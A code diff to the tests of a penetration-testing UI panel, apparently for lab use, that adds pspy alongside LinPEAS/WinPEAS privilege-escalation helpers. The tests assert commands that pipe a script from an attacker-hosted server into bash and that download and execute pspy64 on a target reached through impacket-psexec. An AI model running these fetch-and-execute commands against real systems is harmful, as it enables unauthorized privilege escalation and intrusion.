@@ -18,13 +18,14 @@ it("renders nothing without an open session", () => {
   expect(container.firstChild).toBeNull();
 });
 
-it("prefills the shell and only queues LinPEAS/WinPEAS commands once the server is running", () => {
+it("prefills the shell and only queues LinPEAS/WinPEAS/pspy commands once the server is running", () => {
   const onSendCommand = vi.fn();
   const onToggleServer = vi.fn();
   render(
     <PrivescSessionPanel
       session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
-      server={{running: true, base_url: "http://10.10.14.1:8000"}}
+      server={{running: true, base_url: "http://10.10.14.1:8000",
+        available: {peass: true, pspy: true}}}
       serverBusy={false} onToggleServer={onToggleServer}
       onSendCommand={onSendCommand} onClose={vi.fn()} />,
   );
@@ -36,11 +37,16 @@ it("prefills the shell and only queues LinPEAS/WinPEAS commands once the server 
   expect(onToggleServer).toHaveBeenCalledOnce();
   fireEvent.click(screen.getByText("LinPEAS 명령 셸에 입력"));
   expect(onSendCommand).toHaveBeenCalledWith(
-    "curl -sS http://10.10.14.1:8000/linpeas/linpeas.sh | bash",
+    "curl -sS http://10.10.14.1:8000/peass/linpeas/linpeas.sh | bash",
+  );
+  fireEvent.click(screen.getByText("pspy 명령 셸에 입력"));
+  expect(onSendCommand).toHaveBeenCalledWith(
+    "curl -sS http://10.10.14.1:8000/pspy/pspy64 -o /tmp/pspy64 "
+    + "&& chmod +x /tmp/pspy64 && /tmp/pspy64",
   );
 });
 
-it("disables LinPEAS/WinPEAS buttons while the server is stopped", () => {
+it("disables LinPEAS/WinPEAS/pspy buttons while the server is stopped", () => {
   render(
     <PrivescSessionPanel session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
       server={{running: false}} serverBusy={false} onToggleServer={vi.fn()}
@@ -48,5 +54,19 @@ it("disables LinPEAS/WinPEAS buttons while the server is stopped", () => {
   );
   expect(screen.getByText("LinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
   expect(screen.getByText("WinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
+  expect(screen.getByText("pspy 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
   expect(screen.getByText("서버 시작")).toBeTruthy();
+});
+
+it("disables only the pspy button when pspy is not installed but peass is", () => {
+  render(
+    <PrivescSessionPanel session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
+      server={{running: true, base_url: "http://10.10.14.1:8000",
+        available: {peass: true, pspy: false}}}
+      serverBusy={false} onToggleServer={vi.fn()}
+      onSendCommand={vi.fn()} onClose={vi.fn()} />,
+  );
+  expect(screen.getByText("LinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(false);
+  expect(screen.getByText("pspy 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
+  expect(screen.getByText(/pspy가 설치되어 있지 않아/)).toBeTruthy();
 });
